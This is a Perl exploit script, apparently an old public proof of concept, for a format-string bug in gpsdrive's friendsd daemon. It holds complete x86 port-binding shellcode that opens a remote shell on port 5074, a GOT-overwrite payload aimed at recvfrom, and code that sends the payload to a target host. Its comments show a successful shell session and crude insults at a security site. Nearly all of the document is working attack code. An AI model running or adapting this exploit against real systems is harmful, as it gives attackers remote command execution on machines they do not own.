#!/usr/bin/perl -w
# 
# Code by KF, although it is most likely ripped from John H. 
#  (kf_lists[at]digital_munition[dot]com)
#
# http://www.digitalmunition.com
#
# FrSIRT 24/24 & 7/7 - Centre de Recherche on Donkey Testicles.
# Free 14 day Testicle licking trial available!
#
# friendsd.c:367:   fprintf (stderr, txt);
#
# Tested on intel using gpsdrive_2.09-2_i386.deb
# 
# kfinisterre@animosity:~$ telnet localhost 5074
# Trying 127.0.0.1...
# Connected to animosity
# Escape character is '^]'.
# id;
# uid=1000(kfinisterre) gid=1000(kfinisterre) groups=1000(kfinisterre)
# : command not found
#
# s0t4ipv6@Shellcode.com.ar
# x86 portbind a shell in port 5074
# 92 bytes.
# 
# This shit is NOT robust and most likely will NOT work on kernel 2.6.12 
# because of the random address space. Find your own damn pointers to overwrite
#
$shellcode  = "\x90" x 2 . 
"\x31\xc0" .			# xorl		%eax,%eax
"\x50" .			# pushl	%eax
"\x40" .			# incl		%eax
"\x89\xc3" .			# movl		%eax,%ebx
"\x50" .			# pushl	%eax
"\x40" .			# incl		%eax
"\x50" .			# pushl	%eax
"\x89\xe1" .			# movl		%esp,%ecx
"\xb0\x66" .			# movb		$0x66,%al
"\xcd\x80" .			# int		$0x80
"\x31\xd2" .			# xorl		%edx,%edx
"\x52" .			# pushl	%edx
"\x66\x68\x13\xd2" .		# pushw	$0xd213
"\x43" .			# incl		%ebx
"\x66\x53" .			# pushw	%bx
"\x89\xe1" .			# movl		%esp,%ecx
"\x6a\x10" .			# pushl	$0x10
"\x51" .			# pushl	%ecx
"\x50" .			# pushl	%eax
"\x89\xe1" .			# movl		%esp,%ecx
"\xb0\x66" .			# movb		$0x66,%al
"\xcd\x80" .			# int		$0x80
"\x40" .			# incl		%eax
"\x89\x44\x24\x04" .		# movl		%eax,0x4(%esp,1)
"\x43" .			# incl		%ebx
"\x43" .			# incl		%ebx
"\xb0\x66" .			# movb		$0x66,%al
"\xcd\x80" .			# int		$0x80
"\x83\xc4\x0c" .		# addl		$0xc,%esp
"\x52" .			# pushl	%edx
"\x52" .			# pushl	%edx
"\x43" .			# incl		%ebx
"\xb0\x66" .			# movb		$0x66,%al
"\xcd\x80" .			# int		$0x80
"\x93" .			# xchgl	%eax,%ebx
"\x89\xd1" .			# movl		%edx,%ecx
"\xb0\x3f" .			# movb		$0x3f,%al
"\xcd\x80" .			# int		$0x80
"\x41" .			# incl		%ecx
"\x80\xf9\x03" .		# cmpb		$0x3,%cl
"\x75\xf6" .			# jnz		<shellcode+0x40>
"\x52" .			# pushl	%edx
"\x68\x6e\x2f\x73\x68" .	# pushl	$0x68732f6e
"\x68\x2f\x2f\x62\x69" .	# pushl	$0x69622f2f
"\x89\xe3" .			# movl		%esp,%ebx
"\x52" .			# pushl	%edx
"\x53" .			# pushl	%ebx
"\x89\xe1" .			# movl		%esp,%ecx
"\xb0\x0b" .			# movb		$0xb,%al
"\xcd\x80";			# int		$0x80

use Net::Friends;
use Data::Dumper;

$name = 'GPSDRIVE-aaaa';

# 0804bb84 R_386_JUMP_SLOT   recvfrom
$addy  = "\x86\xbb\x04\x08";  # This is the write address. 
$addy2 = "\x84\xbb\x04\x08"; 

#$retaddr = 0xbfffba7c;  # Retaddr when using gdb 
$retaddr = 0xbfffba8a;  # Retaddr when NOT using gdb. Its that same kick you in the face styleee from the ppc sploit. 

$lo = ($retaddr >> 0) & 0xffff;
$hi = ($retaddr >> 16) & 0xffff;
		
$hi = $hi - 0x4c;
$lo = (0x10000 + $lo) - $hi - 0x4c;		

$hi =1; $lo =1;

$dir = "$addy$addy2%." . $hi . "d%379\$x%." . $lo . "d%380\$x$shellcode";

$friends = Net::Friends->new(shift || 'localhost');
$friends->report(name => $name, lat => '1111', lon => '2222', speed => '3333', dir => $dir);

print Dumper($friends->query);

# P.S. - I fart in the general direction of Fr-Sirt. 
